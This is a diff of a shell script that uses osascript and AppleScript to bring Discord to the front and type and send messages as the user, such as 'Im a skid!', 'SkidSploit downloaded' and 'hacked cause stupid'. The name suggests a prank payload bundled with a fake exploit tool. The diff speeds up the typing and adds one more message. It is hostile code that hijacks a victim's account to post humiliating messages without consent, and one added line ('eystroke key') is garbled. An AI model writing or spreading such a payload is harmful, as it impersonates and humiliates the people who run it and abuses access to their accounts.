@@ -10,7 +10,7 @@ delay 0.1
 tell application "System Events"
     repeat with key in {"I", "m", " ", "a", " ", "s", "k", "i", "d", "!"}
         keystroke key
-        delay 0.1
+        delay 0.05
     end repeat
 
      keystroke return
@@ -30,12 +30,12 @@ tell application "Discord"
     activate
 end tell
 
-delay 0.1
+delay 0.02
 
 tell application "System Events"
     repeat with key in {"S", "k", "i", "d", "S", "p", "l", "o", "i", "t", " ", "d", "o", "w", "n", "l", "o", "a", "d", "e", "d"}
         keystroke key
-        delay 0.1
+        delay 0.03
     end repeat
 
      keystroke return
@@ -50,9 +50,9 @@ end tell
 delay 0.1
 
 tell application "System Events"
-    repeat with key in {"I", "m", " ", "s", "t", "u", "p", "i", "d"}
+    repeat with key in {"I", "m", " ", "s", "t", "u", "p", "i", "d", " ", "b", "e", "c", "a", "u", "s", "e"}
         keystroke key
-        delay 0.1
+        delay 0.02
     end repeat
 
      keystroke return
@@ -69,7 +69,24 @@ delay 0.1
 tell application "System Events"
     repeat with key in {"I", " ", "t", "h", "i", "n", "k", " ", "I", " ", "c", "a", "n", " ", "g", "e", "t", " ", "a", "n", " ", "e", "x", "e", "c", "u", "t", "o", "r", " ", "f", "o", "r", " ", "f", "r", "e", "e"}
         keystroke key
-        delay 0.1
+        delay 0.02
+    end repeat
+
+     keystroke return
+end tell
+'
+
+osascript -e '
+tell application "Discord"
+    activate
+end tell
+
+delay 0.1
+
+tell application "System Events"
+    repeat with key in {"h", "a", "c", "k", "e", "d", " ", "c", "a", "u", "s", "e", " ", "s", "t", "u", "p", "i", "d"}
+eystroke key
+        delay 0.02
     end repeat
 
      keystroke return
